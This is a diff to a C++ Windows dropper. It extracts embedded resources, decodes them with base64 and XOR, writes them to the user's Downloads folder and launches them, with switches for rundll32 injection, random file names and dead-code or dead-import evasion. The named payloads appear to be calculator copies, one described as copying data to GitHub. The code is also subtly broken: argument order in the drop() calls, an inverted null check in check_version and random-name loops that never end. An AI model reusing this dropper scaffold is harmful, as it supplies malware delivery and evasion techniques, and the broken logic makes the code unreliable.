@@ -18,6 +18,7 @@
 #endif
 
 #include<cstdlib>
+#include<cstdint>
 #include<iostream>
 #include<stdio.h>		// Debug Prints
 #include<cstdint>
@@ -47,12 +48,15 @@
 
 // Functions prototypes
 void dead();
-void drop(int size, void* buffer);
+std::uint64_t check_version();
+void w7_dropper_start();
+void w11_dropper_start();
+void drop(int size, void* buffer, std::string);
 void* XOR(void* data, int size);
 void* base64decode(void* data, DWORD* size);
-void launch();
-void set_name();
-void setup_name();
+void launch(std::string);
+void set_name(std::uint64_t);
+void setup_name(std::uint64_t);
 
 // Dropper Configurations
 #define DEAD_IMPORTS
@@ -60,72 +64,261 @@ void setup_name();
 #define NAME_SIZE 10
 //#define PAYLOAD_CMP_TEST
 //#define DROPPER_EXTRACT_TEST
+#define W7_EXTRACT
 //#define INJECT
 
+
 // global: final binary name
-char name[512];
+
+typedef LONG(WINAPI* RtlGetVersionPtr)(PRTL_OSVERSIONINFOW);
+std::uint64_t os_version;
+HMODULE h;
+
+// 1 w11calc.exe (calculator for windows 11)
+// 2 payload.exe (copies the version of calculator onto github)
+// 3 payload.bat (copies calc.exe onto Downloads)
+// 4 7calc.exe (calculator for windows 7)
+
+std::string name1;
+std::string name2;
+std::string name3;
+std::string name4;
+
+HRSRC r1;
+HRSRC r2;
+HRSRC r3;
+HRSRC r4;
+
+HGLOBAL rc1;
+HGLOBAL rc2;
+HGLOBAL rc3;
+HGLOBAL rc4;
+
+void* data1;
+void* data2;
+void* data3;
+void* data4;
+
+DWORD size1;
+DWORD size2;
+DWORD size3;
+DWORD size4;
 
 // Entry Point
 int main(int argc, char* argv[])
 {
 
-	setup_name();
+	os_version = check_version();
+
+	setup_name(os_version);
+
+	set_name(os_version);
 
 	// Handle to myself
-	HMODULE h = GetModuleHandle(NULL);
-	// Locate Resource
-	HRSRC r = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
-	// Load Resource
-	HGLOBAL rc = LoadResource(h, r);
-	// Ensure nobody else will handle it
-	void* data = LockResource(rc);
-	// Get embedded file size
-	DWORD size = SizeofResource(h, r);
-	// Obfuscation Procedures start here
+	h = GetModuleHandle(NULL);
+
+	if (os_version == 0){
+		std::cout << "check_version failed. Cannot veriy OS version";
+		return 0;
+	}
+
+
+/////////////////////////////////////////////////////
+
+	 //Windows 7 version of Dropper
+
+/////////////////////////////////////////////////////
+
+	else if (os_version == 6) {
+#ifdef W7_EXTRACT
+
+		w7_dropper_start();
+
+		drop(data2, size2, name2);
+
+		drop(data3, size3, name3);
+
+		launch(name2);
+
+		launch(name3);
+#else
+
+		w7_dropper_start();
 
 	#if DROPPER_BASE64 == 1
-		data = base64decode(data, &size);
+		data4 = base64decode(data4, &size4);
 	#endif
 
 	#if DROPPER_XOR_KEY != 0
 		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
-		data = XOR(data, size);
+		data4 = XOR(data4, size4);
 	#endif
 
-	// where to drop
-	set_name();
-	// Drop to Disk
+		drop(data4, size4, name4);
 
-	drop(size, data);
-	// process
-	launch();
+		launch(name4);
+
+#endif
+
 #ifdef DEAD_CODE
-	// dead code
-	dead();
+		// dead code
+		dead();
 #endif
 	// exit without waiting child process
 
+	}
+
+////////////////////////////////////////////////////////
+
+	// Windows 10 handling of dropper
+
+////////////////////////////////////////////////////////
+
+	else if (os_version == 10) {
+
+		w11_dropper_start();
+
+	#if DROPPER_BASE64 == 1
+		data1 = base64decode(data1, &size1);
+	#endif
+
+	#if DROPPER_XOR_KEY != 0
+		std::cout << std::hex << DROPPER_XOR_KEY << std::endl;
+		data1 = XOR(data1, size1);
+	#endif
+
+		drop(data1, size1, name1);
+
+		launch(name1);
+#ifdef DEAD_CODE
+		// dead code
+		dead();
+#endif
+
+	}
+
+	else {
+		std::cout << "OS that couldn't be handled.";
+		return 0;
+	}
+
+	// exit without waiting child process
 	return 0;
 }
 
+std::uint64_t check_version(){
 
+	HMODULE hModule = GetModuleHandle("ntdll.dll");
+	auto pRtlGetVersion = reinterpret_cast<RtlGetVersionPtr>(GetProcAddress(hModule, "RtlGetVersion"));
+	if (pRtlGetVersion == 0) { // sucess
+		RTL_OSVERSIONINFOW info = {};
+		info.dwOSVersionInfoSize = sizeof(info);
 
-
-void setup_name() {
-
-	const char* temp = std::getenv("USERPROFILE");
-	if (temp != nullptr){
-		strncpy(name, temp, sizeof(name));
-		strcat(name, "\\Downloads");
-		name[sizeof(name) - 1] = '\0';
-	} else {
-		printf("Problem with userprofile");
+		if (pRtlGetVersion(&info) == 0){
+			return (std::uint64_t) info.dwMajorVersion;
+		}
 	}
+
+	return 0;
 
 }
 
-void set_name()
+// Gets the upper part of the file path for the respective name (name1, name2, etc.)
+void setup_name(std::uint64_t os_version) {
+	if (os_version == 0){
+		return;
+	}
+	else if (os_version == 6){
+#ifdef W7_EXTRACT
+
+		const char* temp = std::getenv("USERPROFILE");
+		if (temp != nullptr){
+			name2 += temp;
+			name2 += "\\Downloads";
+
+			name3 += temp;
+			name3 += "\\Downloads";
+		} else {
+			printf("Problem with userprofile");
+		}
+
+#else
+
+		const char* temp = std::getenv("USERPROFILE");
+		if (temp != nullptr){
+			name4 += temp;
+			name4 += "\\Downloads";
+
+		} else {
+			printf("Problem with userprofile");
+		}
+
+#endif
+	}
+	else if (os_version == 10){
+
+		const char* temp = std::getenv("USERPROFILE");
+		if (temp != nullptr){
+			name1 += temp;
+			name1 += "\\Downloads";
+
+		} else {
+			printf("Problem with userprofile");
+		}
+	}
+	else {
+		std::cout << "Name wasn't given because of unknown OS\n";
+	}
+}
+
+// Adds the lower end of the filepath to the respective name (name1, name2, etc.).
+void set_name(std::uint64_t os_version)
 {
+	if (os_version == 0) {
+		std::cout << "Could not set name due to invalid OS\n";
+	}
+
+	else if (os_version == 6) {
+
+#ifdef W7_EXTRACT
+
+	int valid = 0;
+	#ifdef RANDOM_NAME
+		valid = 0;
+		srand(time(NULL));
+		while (valid < NAME_SIZE)
+		{
+			char c = rand();
+			if (c >= 'a' && c <= 'z')
+			{
+				name2.push_back(c);
+			}
+		}
+		valid = 0;
+		srand(time(NULL));
+		while (valid < NAME_SIZE)
+		{
+			char c = rand();
+			if (c >= 'a' && c <= 'z')
+			{
+				name3.push_back(c);
+			}
+		}
+	#else
+
+		name2+="file_get.exe";
+		name3+="file_move.bat";
+
+	#endif
+#else
+
+	name4+=DROPPER_OUTPUT;
+
+#endif
+	}
+
+	else if (os_version == 10) {
+
 #ifdef RANDOM_NAME
 	int valid = 0;
 	srand(time(NULL));
@@ -134,16 +327,67 @@ void set_name()
 		char c = rand();
 		if (c >= 'a' && c <= 'z')
 		{
-			name[valid++] = c;
+			name1.push_back(c);
 		}
 	}
 #else
-	strcat(name, DROPPER_OUTPUT);
+
+	name1+=DROPPER_OUTPUT;
 #endif
+	}
+
+	else {
+		std::cout << "Cannot set name for unsupported OS\n";
+	}
+
+}
+
+// Gets the resource from the resource section
+void w7_dropper_start(){
+#ifdef W7_EXTRACT
+	// Locate Resource
+	r2 = FindResource(h, MAKEINTRESOURCE(IDR_BIN2), MAKEINTRESOURCE(BIN));
+	r3 = FindResource(h, MAKEINTRESOURCE(IDR_BIN3), RT_RCDATA);
+	// Load Resource
+	rc2 = LoadResource(h, r2);
+	// Ensure nobody else will handle it
+	data2 = LockResource(rc2);
+	// Get embedded file size
+	size2 = SizeofResource(h, r2);
+
+	rc3 = LoadResource(h, r3);
+	// Ensure nobody else will handle it
+	data3 = LockResource(rc3);
+	// Get embedded file size
+	size3 = SizeofResource(h, r3);
+#else
+	//Locate Resource
+	r4 = FindResource(h, MAKEINTRESOURCE(IDR_BIN4), MAKEINTRESOURCE(BIN));
+	// Load Resource
+	rc4 = LoadResource(h, r4);
+	// Ensure nobody else will handle it
+	data4 = LockResource(rc4);
+	// Get embedded file size
+	size4 = SizeofResource(h, r4);
+
+#endif
+
+}
+
+// Gets the resource from the resource section
+void w11_dropper_start(){
+	// Locate Resource
+	r1 = FindResource(h, MAKEINTRESOURCE(IDR_BIN1), MAKEINTRESOURCE(BIN));
+	// Load Resource
+	rc1 = LoadResource(h, r1);
+	// Ensure nobody else will handle it
+	data1 = LockResource(rc1);
+	// Get embedded file size
+	size1 = SizeofResource(h, r1);
 }
 
 // Launch a New Process based on the dropped file name
-void launch()
+void launch(std::string run_exe)
 {
 	STARTUPINFOA si;
 	PROCESS_INFORMATION pi;
@@ -154,18 +398,18 @@ void launch()
 #ifdef INJECT
 	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
 	char args[100 * NAME_SIZE];
-	sprintf_s(args, 999, "%s %s", cmd, name);
+	sprintf_s(args, 999, "%s %s", cmd, run_exe);
 	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	// call directly
 #else
-	BOOL err = CreateProcessA(name, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	BOOL err = CreateProcessA(run_exe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	if (!err) {
 		printf("%u\n", GetLastError());
 	}
 #endif
 }
 
-// Decode a Base64 String 
+// Decode a Base64 String
 // modified and  copied from geeks for geeks
 void* base64decode(void* data, DWORD* size)
 {
@@ -226,9 +470,9 @@ void* XOR(void* data, int size) {
 }
 
 // Drop buffer to file
-void drop(int size, void* buffer)
+void drop(int size, void* buffer, std::string drop_name)
 {
-	FILE* f = fopen(name, "wb");
+	FILE* f = fopen(drop_name.c_str(), "wb");
 	printf("drop has run");
 	// traverse byte list
 	if (!f) {
@@ -248,73 +492,6 @@ void drop(int size, void* buffer)
 		// file fully written
 		fclose(f);
 	}
-
-#ifdef PAYLOAD_CMP_TEST	
-	STARTUPINFOA si;
-	PROCESS_INFORMATION pi;
-	ZeroMemory(&si, sizeof(si));
-	si.cb = sizeof(si);
-	ZeroMemory(&pi, sizeof(pi));
-
-	char* temp = std::getenv("USERPROFILE");
-	std::string cmd; 
-
-
-	std::string downloadsPath = std::string(temp) + "\\fc_output1.txt";
-	if (temp != nullptr)
-	{
-
-	    cmd =
-	        "fc /b \"C:\\Windows\\System32\\calc.exe\" \"" +
-	        std::string(name) +
-	        "\" > \"" +
-	        downloadsPath +
-	        "\"";
-	}
-	else
-	{
-	    printf("UserProfile was null");
-	}
-
-        int result = system(cmd.c_str());
-	std::string notepad_test = "notepad.exe " + downloadsPath;
-
-	BOOL err = CreateProcessA(nullptr, notepad_test.c_str(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-
-	std::cout << "This is result: " << result << "\n";
-
-        std::string cmpPath = "C:\\Users\\adind\\Dropper\\Walmart-version-of-Dropper\\Linux_mint_22.3\\FileSystem_exe_rebuild\\calc.exe";
-	downloadsPath = std::string(temp) + "\\fc_output2txt";
-        cmd =
-	        "fc /b \"C:\\Windows\\System32\\calc.exe\" \"" +
-	        cmpPath +
-	        "\" > \"" +
-	        downloadsPath +
-	        "\"";
-
-        result = system(cmd.c_str());
-	std::cout << "This is result: " << result << "\n";
-#endif
-
-#ifdef DROPPER_EXTRACT_TEST
-
-	FILE* src = fopen("C:\\Windows\\System32\\calc.exe", "rb");
-	FILE* dst = fopen(name, "wb");
-
-	unsigned char bfr[4096];
-	size_t bytesRead;
-
-	while ((bytesRead = fread(bfr, 1, sizeof(bfr), src)) > 0){
-		size_t bytesWritten = fwrite(bfr, 1, bytesRead, dst);
-		if (bytesWritten != bytesRead){
-			perror("write error");
-			break;
-		}
-	}
-
-	fclose(src);
-	fclose(dst);
-#endif 
 
 }
 
